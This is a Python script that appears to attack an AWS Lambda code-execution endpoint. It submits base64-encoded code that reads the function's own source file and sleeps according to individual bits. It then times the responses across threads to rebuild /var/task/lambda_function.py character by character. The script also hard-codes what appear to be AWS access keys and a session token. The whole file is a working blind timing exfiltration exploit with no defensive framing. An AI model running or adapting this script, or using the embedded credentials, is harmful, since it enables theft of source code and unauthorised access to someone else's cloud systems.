import requests
import json
import base64
import time
import threading
import queue
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIIWK4BEMG",
                       aws_secret_access_key="yQXeKSwcKm2sMkj34DVhMhzMAQ/U+U1en5S4xmsd",
                       aws_token="IQoJb3JpZ2luX2VjELj//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCIDF7JGpYPE2Awtt7TrTdowno6OzcS1UBLm1VG22edZvjAiAv6CKYlLqEA5XGHTjHC7Zd31GU07fTZIRT5h7wSS8G/Cq1AgglEAAaDDEyMTc3NDA1Mjg4MCIM8Ws5xRwIAZJyZCjjKpICTQVLdf5ZWWgYfpiwvtdLAL0/+M0Ni6LskzqCorBijcWaC1N3cRkuqy3kc12VA7NtjK/D7SCZmtYRDNt5pbZnvg48BZqtjY8gr0EMWKU0Y3ihq4VRkG9Ey73csFLx+gsgxkvyK6Bv9O4tVKZbTVrQ305DcAKTL2zpTB86uM9TGG/Y7D72CqrKLYPlYl2n2QK1Wyc46WaM/CakboW6J9IxNlIVGymn6hm1gdxC/nk7YShxnCg9Kh3rPwquB0axT85cSeVOVX3a6quCb1+fVY5PT4flf4y216WIRqyPDFywpQVxEC769cf/4zu6LOKWbTPaK18wFRu+XXVw/XbkPE+dBb9MqbtaP4tKSD6rmD5fqCrlwDCCw8zTBjqeAcYMGqS2qPpmzSR6yQkw5yPW14q0kin4++AZfBFJS0gZta7D90stYQPFM0+OsMz1yqfueBMihYUxZblCv2kj5nQLpPMPSMSx9gL/PKZtTO5+fRdOMtkjPWsdF3Z6O+Y37DDagfhoUmrMUoBTWBZLdenZp00N2Wb9oGwCMq1oRYjVnqoQjNABxqiaRSP/m1T1LN5hFw7DBYkgkvIQ1DVT",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def check_bit(pos, bit):
    code = f"""
import os, time
try:
    with open('/var/task/lambda_function.py', 'r') as f:
        val = f.read()
except Exception as e:
    val = type(e).__name__

if len(val) > {pos} and (ord(val[{pos}]) & {bit}):
    time.sleep(2.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(URL, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    return (time.time() - start) > 1.5

def extract_pos(pos):
    char_code = 0
    for bit in [1, 2, 4, 8, 16, 32, 64]:
        if check_bit(pos, bit):
            char_code |= bit
    return chr(char_code) if char_code > 0 else ""

def thread_worker(pos, q):
    c = extract_pos(pos)
    q.put((pos, c))

def get_ex():
    print("Extracting lambda_function.py...", flush=True)
    length = 2000
    res = [""] * length
    
    for chunk_start in range(0, length, 20):
        chunk_end = min(length, chunk_start + 20)
        threads = []
        queues = []
        for pos in range(chunk_start, chunk_end):
            q = queue.Queue()
            t = threading.Thread(target=thread_worker, args=(pos, q))
            t.start()
            threads.append(t)
            queues.append(q)
        for i, t in enumerate(threads):
            t.join()
            pos, c = queues[i].get()
            res[pos] = c
        curr = "".join(res[:chunk_end])
        print(f"Progress: {curr}", flush=True)
        if curr.endswith("}") or curr.endswith("```"): 
            pass # Keep going unless it's clearly the end of the file
    return "".join(res)

print("RESULT:", get_ex(), flush=True)
